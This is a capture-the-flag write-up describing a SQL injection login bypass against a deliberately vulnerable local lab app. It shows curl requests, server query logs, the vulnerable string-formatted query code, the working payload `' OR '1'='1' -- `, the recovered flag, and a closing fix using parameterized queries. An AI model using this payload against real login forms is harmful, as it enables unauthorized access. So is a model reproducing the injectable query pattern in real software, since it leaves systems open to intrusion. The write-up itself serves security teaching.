# Writeup: SQL Injection Login Bypass

By Gavin Blacklock

## The Setup

I started the app from the lab folder:

```bash
python3 app.py
```

It answered with the one line I wanted:

```text
Listening on http://127.0.0.1:8001
```

Port 8001, a login form at `/`, and a flag waiting on the other side
of a login I did not have the password for. I worked the whole lab
from the terminal with curl.

## What I Tried First That Did Not Work

I started the obvious way: I guessed. Admin accounts collect bad
password guesses the way porches collect rain, and I added two more.

```bash
$ curl -s -i -X POST http://127.0.0.1:8001/login -d "username=admin&password=wrongpassword"
HTTP/1.0 401 Unauthorized
Server: BaseHTTP/0.6 Python/3.12.3
Date: Mon, 02 Nov 2026 15:44:58 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 179

<!doctype html>
<html>
<head><title>Login failed</title></head>
<body>
<h1>Login failed</h1>
<p>Invalid username or password.</p>
<p><a href="/">Try again</a></p>
</body>
</html>
```

One more guess changed nothing:

```bash
$ curl -s -i -X POST http://127.0.0.1:8001/login -d "username=admin&password=letmein"
HTTP/1.0 401 Unauthorized
Server: BaseHTTP/0.6 Python/3.12.3
Date: Mon, 02 Nov 2026 15:44:58 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 179

<!doctype html>
<html>
<head><title>Login failed</title></head>
<body>
<h1>Login failed</h1>
<p>Invalid username or password.</p>
<p><a href="/">Try again</a></p>
</body>
</html>
```

Two attempts, two identical 401 pages. Guessing was a dead end, and
it was never going to stop being one. The password was not the weak
point. The question was whether the login itself was built badly.

## The Breakthrough Moment

The app logs every query it runs, and that log gave the whole game
away. After my failed attempts, the server side showed this line:

```text
[app] query: SELECT * FROM users WHERE username = 'admin' AND password = 'wrongpassword'
```

Reading `app.py` confirmed why. The query is built by dropping the
username and password straight into a string:

```python
query = (
    f"SELECT * FROM users WHERE username = '{username}' "
    f"AND password = '{password}'"
)
```

My input was not being compared to the query. My input was becoming
the query. So I stopped trying to know the password and started
writing SQL instead. If I put a single quote in the username, the
username string ends early. If I follow it with `OR '1'='1'`, the
`WHERE` clause is true for a real row no matter what. And if I end it
with `-- `, SQL treats the rest of the line as a comment, so the
password check simply stops existing.

That was the moment the lab tipped over. I was not picking a lock. I
was being handed the pen that wrote the guest list.

## The Full Solution

One request, with the payload carried in the username field and any
password at all in the password field:

```bash
$ curl -s -i -X POST http://127.0.0.1:8001/login --data-urlencode "username=' OR '1'='1' -- " --data-urlencode "password=anything"
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.12.3
Date: Mon, 02 Nov 2026 15:44:58 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 204

<!doctype html>
<html>
<head><title>Welcome</title></head>
<body>
<h1>Welcome, admin</h1>
<p>You are in. Here is the flag you earned:</p>
<p><strong>SALVO{sql_1nj3ct10n_club}</strong></p>
</body>
</html>
```

HTTP 200 instead of 401, and "Welcome, admin" at the top. The server
log showed the query my input had bent into shape:

```text
[app] query: SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'anything'
```

Read that query slowly and the bypass explains itself:

1. The first quote closes the empty username string.
2. `OR '1'='1'` is always true, so the row matches.
3. `-- ` comments out everything after it, including
   `AND password = 'anything'`, so the wrong password never matters.
4. The database returns the first matching row, which is admin, and
   the app serves the logged in page.

Step by step, the replay is short:

```bash
python3 app.py
curl -s -i -X POST http://127.0.0.1:8001/login -d "username=admin&password=wrongpassword"
curl -s -i -X POST http://127.0.0.1:8001/login --data-urlencode "username=' OR '1'='1' -- " --data-urlencode "password=anything"
```

The fix, for anyone building the real thing: never build SQL with
string formatting. Use parameterized queries, where the database
driver keeps input as data and never lets it become syntax. This app
skips that protection on purpose, and that one choice is the whole
vulnerability.

## Flag Verified

I pulled the flag out of the response on its own to be sure I was
reading the page right:

```bash
$ curl -s -X POST http://127.0.0.1:8001/login --data-urlencode "username=' OR '1'='1' -- " --data-urlencode "password=anything" | grep -o "SALVO{[^}]*}"
SALVO{sql_1nj3ct10n_club}
```

Recovered and verified flag:

```text
SALVO{sql_1nj3ct10n_club}
```
